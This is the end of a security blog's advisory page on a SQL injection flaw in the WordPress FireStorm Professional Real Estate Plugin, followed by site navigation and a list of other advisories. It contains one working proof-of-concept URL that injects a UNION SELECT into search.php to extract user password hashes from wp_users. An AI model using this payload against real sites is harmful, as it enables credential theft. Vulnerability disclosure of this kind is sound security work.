				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b9435529608238-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b9435529608238-1">http://192.168.80.130/wordpress/wp-content/plugins/fs-real-estate-plugin/search.php?ProvinceID=35335%20UNION%20SELECT%201,%20user_pass,%203,%204,%205,%206,%207,%208%20from%20wp_users</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/firestorm-professional-real-estate-plugin/" rel="tag">FireStorm Professional Real Estate Plugin</a>, <a href="https://charlieeriksen.github.io/tag/sql-injection/" rel="tag">SQL Injection</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/10/25/wordpress-firestorm-professional-real-estate-plugin-sql-injection-vulnerability/#respond" title="Comment on WordPress FireStorm Professional Real Estate Plugin SQL Injection vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-183 -->

				
					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="https://charlieeriksen.github.io/page/3/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						<div class="nav-next"><a href="https://charlieeriksen.github.io/" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
						
		
	
	</nav><!-- #nav-below -->
	
			
			</div><!-- #content -->
		</div><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (32)
</li>
	<li class="cat-item cat-item-12"><a href="https://charlieeriksen.github.io/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="https://charlieeriksen.github.io/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->


</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 21:15:37 by W3 Total Cache -->